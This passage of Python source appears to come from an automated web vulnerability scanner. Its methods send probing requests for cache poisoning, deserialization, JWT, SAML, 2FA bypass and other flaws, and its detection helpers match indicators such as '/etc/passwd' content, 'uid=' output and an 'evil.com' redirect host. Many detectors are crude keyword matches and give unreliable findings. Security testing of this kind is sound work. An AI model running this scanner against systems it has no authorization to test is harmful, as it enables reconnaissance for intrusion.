            try:
                response = await self.make_request(
                    self.target_url,
                    headers={'X-Forwarded-Host': payload}
                )
                
                if response:
                    content = await response.text()
                    if self._detect_cache_poisoning(content, payload):
                        vulnerabilities.append({
                            'type': 'Cache Poisoning',
                            'severity': 'Medium',
                            'payload': payload,
                            'description': 'Cache poisoning vulnerability detected',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"Cache poisoning test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_subdomain_takeover(self) -> List[Dict]:
        """Test for Subdomain Takeover vulnerabilities."""
        vulnerabilities = []
        
        # This would typically require DNS enumeration first
        # For now, we'll test common subdomain patterns
        common_subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api', 'cdn']
        
        for subdomain in common_subdomains:
            for payload in self.subdomain_takeover_payloads:
                try:
                    test_url = f"https://{subdomain}.{urlparse(self.target_url).hostname}"
                    response = await self.make_request(test_url)
                    
                    if response and response.status == 404:
                        content = await response.text()
                        if self._detect_subdomain_takeover(content, payload):
                            vulnerabilities.append({
                                'type': 'Subdomain Takeover',
                                'severity': 'High',
                                'url': test_url,
                                'payload': payload,
                                'description': f'Subdomain takeover vulnerability detected: {subdomain}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Subdomain takeover test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_dns_rebinding(self) -> List[Dict]:
        """Test for DNS Rebinding vulnerabilities."""
        vulnerabilities = []
        
        # Test for DNS rebinding by checking if the application trusts internal IPs
        internal_ips = ['127.0.0.1', 'localhost', '192.168.1.1', '10.0.0.1']
        
        for ip in internal_ips:
            try:
                test_url = f"http://{ip}"
                response = await self.make_request(test_url)
                
                if response:
                    content = await response.text()
                    if self._detect_dns_rebinding(content, ip):
                        vulnerabilities.append({
                            'type': 'DNS Rebinding',
                            'severity': 'High',
                            'url': test_url,
                            'description': f'DNS rebinding vulnerability detected with IP: {ip}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"DNS rebinding test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_insecure_deserialization(self) -> List[Dict]:
        """Test for Insecure Deserialization vulnerabilities."""
        vulnerabilities = []
        
        deserialization_endpoints = ['/api', '/upload', '/import', '/data', '/serialize']
        
        for endpoint in deserialization_endpoints:
            for deserialization_type, payloads in self.deserialization_payloads.items():
                for payload in payloads:
                    try:
                        test_url = urljoin(self.target_url, endpoint)
                        response = await self.make_request(
                            test_url,
                            method='POST',
                            data=payload,
                            headers={'Content-Type': 'application/octet-stream'}
                        )
                        
                        if response:
                            content = await response.text()
                            if self._detect_deserialization(content, payload, deserialization_type):
                                vulnerabilities.append({
                                    'type': f'Insecure Deserialization ({deserialization_type})',
                                    'severity': 'Critical',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': f'{deserialization_type} deserialization vulnerability detected',
                                    'confidence': 'Medium'
                                })
                                
                    except Exception as e:
                        self.logger.error(f"Deserialization test error: {str(e)}")
                        
        return vulnerabilities
        
    async def test_memory_corruption(self) -> List[Dict]:
        """Test for Memory Corruption vulnerabilities."""
        vulnerabilities = []
        
        memory_params = ['data', 'input', 'buffer', 'size', 'length', 'count']
        
        for param in memory_params:
            for corruption_type, payloads in self.memory_corruption_payloads.items():
                for payload in payloads:
                    try:
                        test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                        response = await self.make_request(test_url)
                        
                        if response:
                            content = await response.text()
                            if self._detect_memory_corruption(content, payload, corruption_type):
                                vulnerabilities.append({
                                    'type': f'Memory Corruption ({corruption_type})',
                                    'severity': 'Critical',
                                    'parameter': param,
                                    'payload': payload,
                                    'url': test_url,
                                    'description': f'{corruption_type} memory corruption detected in parameter: {param}',
                                    'confidence': 'Medium'
                                })
                                
                    except Exception as e:
                        self.logger.error(f"Memory corruption test error: {str(e)}")
                        
        return vulnerabilities
        
    async def test_cryptographic_issues(self) -> List[Dict]:
        """Test for Cryptographic Issues vulnerabilities."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                headers = response.headers
                content = await response.text()
                
                crypto_issues = []
                
                # Check for weak encryption indicators
                for weak_cipher in self.crypto_weakness_payloads['weak_ciphers']:
                    if weak_cipher.lower() in content.lower():
                        crypto_issues.append(f'Weak cipher detected: {weak_cipher}')
                        
                # Check for weak hash indicators
                for weak_hash in self.crypto_weakness_payloads['weak_hashes']:
                    if weak_hash in content:
                        crypto_issues.append(f'Weak hash detected: {weak_hash}')
                        
                if crypto_issues:
                    vulnerabilities.append({
                        'type': 'Cryptographic Issues',
                        'severity': 'High',
                        'description': f'Cryptographic issues detected: {", ".join(crypto_issues)}',
                        'confidence': 'Medium'
                    })
                    
        except Exception as e:
            self.logger.error(f"Cryptographic issues test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_hardcoded_credentials(self) -> List[Dict]:
        """Test for Hardcoded Credentials vulnerabilities."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                content = await response.text()
                
                for pattern in self.hardcoded_patterns:
                    if pattern in content.lower():
                        vulnerabilities.append({
                            'type': 'Hardcoded Credentials',
                            'severity': 'Critical',
                            'description': f'Potential hardcoded credential detected: {pattern}',
                            'confidence': 'Low'
                        })
                        
        except Exception as e:
            self.logger.error(f"Hardcoded credentials test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_exposed_api_keys(self) -> List[Dict]:
        """Test for Exposed API Keys vulnerabilities."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                content = await response.text()
                
                # Look for API key patterns
                api_key_patterns = [
                    r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']',
                    r'access[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']',
                    r'secret[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']',
                    r'private[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']'
                ]
                
                for pattern in api_key_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        vulnerabilities.append({
                            'type': 'Exposed API Keys',
                            'severity': 'Critical',
                            'description': f'Exposed API key detected: {pattern}',
                            'matches': matches[:3],  # Limit to first 3 matches
                            'confidence': 'High'
                        })
                        
        except Exception as e:
            self.logger.error(f"Exposed API keys test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_verbose_error_messages(self) -> List[Dict]:
        """Test for Verbose Error Messages vulnerabilities."""
        vulnerabilities = []
        
        error_payloads = ['invalid', 'error', 'exception', 'null', 'undefined', 'nonexistent']
        
        for payload in error_payloads:
            try:
                test_url = f"{self.target_url}?param={urllib.parse.quote(payload)}"
                response = await self.make_request(test_url)
                
                if response:
                    content = await response.text()
                    if self._detect_verbose_errors(content, payload):
                        vulnerabilities.append({
                            'type': 'Verbose Error Messages',
                            'severity': 'Low',
                            'payload': payload,
                            'url': test_url,
                            'description': 'Verbose error messages detected',
                            'confidence': 'High'
                        })
                        
            except Exception as e:
                self.logger.error(f"Verbose error messages test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_file_upload_vulnerabilities(self) -> List[Dict]:
        """Test for File Upload Vulnerabilities."""
        vulnerabilities = []
        
        upload_endpoints = ['/upload', '/file', '/image', '/document', '/attachment']
        
        for endpoint in upload_endpoints:
            for upload_type, payloads in self.file_upload_payloads.items():
                for payload in payloads:
                    try:
                        test_url = urljoin(self.target_url, endpoint)
                        
                        # Create a file-like object
                        files = {'file': ('test.txt', payload, 'text/plain')}
                        
                        response = await self.make_request(
                            test_url,
                            method='POST',
                            data=files
                        )
                        
                        if response:
                            content = await response.text()
                            if self._detect_file_upload_vulnerability(content, payload, upload_type):
                                vulnerabilities.append({
                                    'type': f'File Upload Vulnerability ({upload_type})',
                                    'severity': 'High',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': f'{upload_type} file upload vulnerability detected',
                                    'confidence': 'Medium'
                                })
                                
                    except Exception as e:
                        self.logger.error(f"File upload test error: {str(e)}")
                        
        return vulnerabilities
        
    async def test_websocket_security(self) -> List[Dict]:
        """Test for WebSocket Security Issues."""
        vulnerabilities = []
        
        websocket_endpoints = ['/ws', '/websocket', '/socket', '/wss']
        
        for endpoint in websocket_endpoints:
            for payload in self.websocket_payloads:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        data=payload,
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    if response:
                        content = await response.text()
                        if self._detect_websocket_vulnerability(content, payload):
                            vulnerabilities.append({
                                'type': 'WebSocket Security Issues',
                                'severity': 'Medium',
                                'url': test_url,
                                'payload': payload,
                                'description': f'WebSocket security issue detected: {endpoint}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"WebSocket security test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_oauth_vulnerabilities(self) -> List[Dict]:
        """Test for OAuth/OIDC Vulnerabilities."""
        vulnerabilities = []
        
        oauth_endpoints = ['/oauth', '/oauth2', '/oidc', '/auth/oauth', '/login/oauth']
        
        for endpoint in oauth_endpoints:
            for oauth_type, payloads in self.oauth_vuln_payloads.items():
                for payload in payloads:
                    try:
                        test_url = urljoin(self.target_url, endpoint)
                        response = await self.make_request(
                            test_url,
                            method='POST',
                            data=payload,
                            headers={'Content-Type': 'application/x-www-form-urlencoded'}
                        )
                        
                        if response:
                            content = await response.text()
                            if self._detect_oauth_vulnerability(content, payload, oauth_type):
                                vulnerabilities.append({
                                    'type': f'OAuth/OIDC Vulnerability ({oauth_type})',
                                    'severity': 'High',
                                    'url': test_url,
                                    'payload': payload,
                                    'description': f'{oauth_type} OAuth vulnerability detected',
                                    'confidence': 'Medium'
                                })
                                
                    except Exception as e:
                        self.logger.error(f"OAuth vulnerability test error: {str(e)}")
                        
        return vulnerabilities
        
    async def test_jwt_security_issues(self) -> List[Dict]:
        """Test for JWT Security Issues."""
        vulnerabilities = []
        
        jwt_endpoints = ['/auth', '/login', '/token', '/jwt', '/api/auth']
        
        for endpoint in jwt_endpoints:
            for payload in self.jwt_payloads:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        json={'token': payload},
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    if response:
                        content = await response.text()
                        if self._detect_jwt_vulnerability(content, payload):
                            vulnerabilities.append({
                                'type': 'JWT Security Issues',
                                'severity': 'High',
                                'url': test_url,
                                'payload': payload,
                                'description': f'JWT security issue detected: {endpoint}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"JWT security test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_saml_vulnerabilities(self) -> List[Dict]:
        """Test for SAML Vulnerabilities."""
        vulnerabilities = []
        
        saml_endpoints = ['/saml', '/saml2', '/auth/saml', '/login/saml']
        
        for endpoint in saml_endpoints:
            for payload in self.saml_payloads:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        data=payload,
                        headers={'Content-Type': 'application/xml'}
                    )
                    
                    if response:
                        content = await response.text()
                        if self._detect_saml_vulnerability(content, payload):
                            vulnerabilities.append({
                                'type': 'SAML Vulnerability',
                                'severity': 'High',
                                'url': test_url,
                                'payload': payload,
                                'description': f'SAML vulnerability detected: {endpoint}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"SAML vulnerability test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_twofa_bypass(self) -> List[Dict]:
        """Test for Two-Factor Authentication Bypass."""
        vulnerabilities = []
        
        twofa_endpoints = ['/2fa', '/mfa', '/otp', '/totp', '/verify', '/confirm']
        
        for endpoint in twofa_endpoints:
            for payload in self.twofa_bypass_payloads:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        data={'code': payload, 'token': 'test'}
                    )
                    
                    if response:
                        content = await response.text()
                        if self._detect_twofa_bypass(content, payload):
                            vulnerabilities.append({
                                'type': 'Two-Factor Authentication Bypass',
                                'severity': 'High',
                                'url': test_url,
                                'payload': payload,
                                'description': f'2FA bypass detected: {endpoint}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"2FA bypass test error: {str(e)}")
                    
        return vulnerabilities
        
    # ==================== DETECTION METHODS ====================
    
    def _detect_xss_reflection(self, content: str, payload: str) -> bool:
        """Detect XSS payload reflection in response."""
        return payload in content
        
    def _detect_privilege_escalation(self, content: str, value: str) -> bool:
        """Detect privilege escalation indicators."""
        privilege_indicators = ['admin', 'administrator', 'root', 'superuser', 'manager', 'owner']
        return any(indicator in content.lower() for indicator in privilege_indicators)
        
    def _detect_code_execution(self, content: str) -> bool:
        """Detect code execution indicators."""
        execution_indicators = ['uid=', 'gid=', 'groups=', 'total ', 'drwx', 'Volume Serial Number']
        return any(indicator in content for indicator in execution_indicators)
        
    def _detect_idor_vulnerability(self, content: str, param: str, value: str) -> bool:
        """Detect IDOR vulnerability indicators."""
        # Check if response contains user-specific data
        user_indicators = ['username', 'email', 'profile', 'account', 'user_id', 'personal']
        return any(indicator in content.lower() for indicator in user_indicators)
        
    def _detect_access_control_bypass(self, content: str, endpoint: str) -> bool:
        """Detect access control bypass indicators."""
        admin_indicators = ['admin panel', 'dashboard', 'control panel', 'management', 'settings', 'configuration']
        return any(indicator in content.lower() for indicator in admin_indicators)
        
    def _detect_business_logic_error(self, content: str, param: str, value: str) -> bool:
        """Detect business logic error indicators."""
        # Check for unusual responses to negative values
        if value.startswith('-') and ('error' not in content.lower() and 'invalid' not in content.lower()):
            return True
        return False
        
    def _detect_open_redirect(self, location: str, payload: str) -> bool:
        """Detect open redirect indicators."""
        return payload in location or 'evil.com' in location
        
    def _detect_rce(self, content: str, payload: str) -> bool:
        """Detect RCE indicators."""
        rce_indicators = ['uid=', 'gid=', 'groups=', 'total ', 'drwx', 'Volume Serial Number']
        return any(indicator in content for indicator in rce_indicators)
        
    def _detect_file_content(self, content: str) -> bool:
        """Detect file system content indicators."""
        file_indicators = ['root:x:0:0:', '[boot loader]', 'Microsoft Windows', '/bin/bash']
        return any(indicator in content for indicator in file_indicators)
        
    def _detect_rfi_content(self, content: str) -> bool:
        """Detect RFI content indicators."""
        rfi_indicators = ['<?php', '<?=', '<script>', 'eval(', 'system(']
        return any(indicator in content for indicator in rfi_indicators)
        
    def _detect_misconfiguration(self, content: str, url: str) -> bool:
        """Detect security misconfiguration indicators."""
        config_indicators = ['password', 'secret', 'key', 'database', 'config', 'settings']
        return any(indicator in content.lower() for indicator in config_indicators)
        
    def _detect_parameter_pollution(self, content: str, param: str) -> bool:
        """Detect parameter pollution indicators."""
        # Check for multiple values in response
        return param in content and content.count(param) > 1
        
    def _detect_race_condition(self, responses: List) -> bool:
        """Detect race condition indicators."""
        # Check if multiple requests succeeded when only one should
        successful_responses = [r for r in responses if r and r.status == 200]
        return len(successful_responses) > 1
        
    def _detect_authorization_bypass(self, content: str, param: str, value: str) -> bool:
        """Detect authorization bypass indicators."""
        auth_indicators = ['admin', 'administrator', 'root', 'superuser', 'manager', 'owner']
        return any(indicator in content.lower() for indicator in auth_indicators)
        
    def _detect_successful_login(self, content: str) -> bool:
        """Detect successful login indicators."""
        success_indicators = ['welcome', 'dashboard', 'logout', 'profile', 'account', 'success']
        return any(indicator in content.lower() for indicator in success_indicators)
        
    def _detect_weak_password_recovery(self, content: str) -> bool:
        """Detect weak password recovery indicators."""
        weak_indicators = ['email sent', 'check your email', 'recovery link', 'reset link']
        return any(indicator in content.lower() for indicator in weak_indicators)
        
    def _detect_username_enumeration(self, content1: str, content2: str) -> bool:
        """Detect username enumeration indicators."""
        # Check if error messages are different for valid vs invalid usernames
        error_patterns = ['user not found', 'invalid username', 'username does not exist']
        return any(pattern in content2.lower() for pattern in error_patterns)
        
    def _detect_graphql_injection(self, content: str, payload: str) -> bool:
        """Detect GraphQL injection indicators."""
        graphql_errors = ['graphql error', 'syntax error', 'validation error', 'introspection']
        return any(error in content.lower() for error in graphql_errors)
        
    def _detect_nosql_injection(self, content: str, payload: str) -> bool:
        """Detect NoSQL injection indicators."""
        nosql_errors = ['mongodb error', 'database error', 'query error', 'syntax error']
        return any(error in content.lower() for error in nosql_errors)
        
    def _detect_xpath_injection(self, content: str, payload: str) -> bool:
        """Detect XPath injection indicators."""
        xpath_errors = ['xpath error', 'xpath syntax error', 'xml parsing error']
        return any(error in content.lower() for error in xpath_errors)
        
    def _detect_template_injection(self, content: str, payload: str, template_type: str) -> bool:
        """Detect template injection indicators."""
        if payload == '{{7*7}}' and '49' in content:
            return True
        if payload == '{7*7}' and '49' in content:
            return True
        if payload == '${7*7}' and '49' in content:
            return True
        return False
        
    def _detect_csv_injection(self, content: str, payload: str) -> bool:
        """Detect CSV injection indicators."""
        csv_indicators = ['=cmd', '=HYPERLINK', '=SUM', 'formula', 'calculation']
        return any(indicator in content for indicator in csv_indicators)
        
    def _detect_email_header_injection(self, content: str, payload: str) -> bool:
        """Detect email header injection indicators."""
        email_indicators = ['email sent', 'message sent', 'mail sent', 'notification sent']
        return any(indicator in content.lower() for indicator in email_indicators)
        
    def _detect_response_splitting(self, content: str, payload: str) -> bool:
        """Detect HTTP response splitting indicators."""
        return '\r\n' in content and ('Set-Cookie' in content or 'Location' in content)
        
    def _detect_request_smuggling(self, content: str, payload: str) -> bool:
        """Detect HTTP request smuggling indicators."""
        smuggling_indicators = ['chunked', 'content-length', 'transfer-encoding']
        return any(indicator in content.lower() for indicator in smuggling_indicators)
        
    def _detect_cache_poisoning(self, content: str, payload: str) -> bool:
        """Detect cache poisoning indicators."""
        return payload in content or 'evil.com' in content
        
    def _detect_subdomain_takeover(self, content: str, payload: str) -> bool:
        """Detect subdomain takeover indicators."""
        takeover_indicators = ['github.io', 'herokuapp.com', 'netlify.com', 'page not found']
        return any(indicator in content.lower() for indicator in takeover_indicators)
        
    def _detect_dns_rebinding(self, content: str, ip: str) -> bool:
        """Detect DNS rebinding indicators."""
        return ip in content or 'localhost' in content
        
    def _detect_deserialization(self, content: str, payload: str, deserialization_type: str) -> bool:
        """Detect deserialization indicators."""
        deserialization_indicators = ['deserialization error', 'object injection', 'class not found']
        return any(indicator in content.lower() for indicator in deserialization_indicators)
        
    def _detect_memory_corruption(self, content: str, payload: str, corruption_type: str) -> bool:
        """Detect memory corruption indicators."""
        corruption_indicators = ['segmentation fault', 'access violation', 'buffer overflow', 'stack overflow']
        return any(indicator in content.lower() for indicator in corruption_indicators)
        
    def _detect_verbose_errors(self, content: str, payload: str) -> bool:
        """Detect verbose error messages."""
        for pattern in self.error_message_patterns:
            if pattern in content.lower():
                return True
        return False
        
    def _detect_file_upload_vulnerability(self, content: str, payload: str, upload_type: str) -> bool:
        """Detect file upload vulnerability indicators."""
        upload_indicators = ['upload successful', 'file uploaded', 'upload complete']
        return any(indicator in content.lower() for indicator in upload_indicators)
        
    def _detect_websocket_vulnerability(self, content: str, payload: str) -> bool:
        """Detect WebSocket vulnerability indicators."""
        websocket_indicators = ['websocket', 'connection established', 'socket connected']
        return any(indicator in content.lower() for indicator in websocket_indicators)
        
    def _detect_oauth_vulnerability(self, content: str, payload: str, oauth_type: str) -> bool:
        """Detect OAuth vulnerability indicators."""
        oauth_indicators = ['oauth', 'authorization', 'access token', 'authorization code']
        return any(indicator in content.lower() for indicator in oauth_indicators)
        
    def _detect_jwt_vulnerability(self, content: str, payload: str) -> bool:
        """Detect JWT vulnerability indicators."""
        jwt_indicators = ['jwt', 'json web token', 'access token', 'bearer token']
        return any(indicator in content.lower() for indicator in jwt_indicators)
        
    def _detect_saml_vulnerability(self, content: str, payload: str) -> bool:
        """Detect SAML vulnerability indicators."""
        saml_indicators = ['saml', 'assertion', 'response', 'authentication']
        return any(indicator in content.lower() for indicator in saml_indicators)
        
    def _detect_twofa_bypass(self, content: str, payload: str) -> bool:
        """Detect 2FA bypass indicators."""
        bypass_indicators = ['2fa bypassed', 'authentication successful', 'login successful']
        return any(indicator in content.lower() for indicator in bypass_indicators)
        
    def _detect_unvalidated_redirect(self, location: str, payload: str) -> bool:
        """Detect unvalidated redirect indicators."""
        return payload in location or 'evil.com' in location
        
    def _detect_admin_function_access(self, content: str, function: str) -> bool:
        """Detect admin function access indicators."""
        admin_indicators = ['admin', 'management', 'control panel', 'settings', 'configuration']
        return any(indicator in content.lower() for indicator in admin_indicators)
        
    def _detect_host_header_injection(self, content: str, payload: str) -> bool:
        """Detect host header injection indicators."""
        return payload in content or 'evil.com' in content
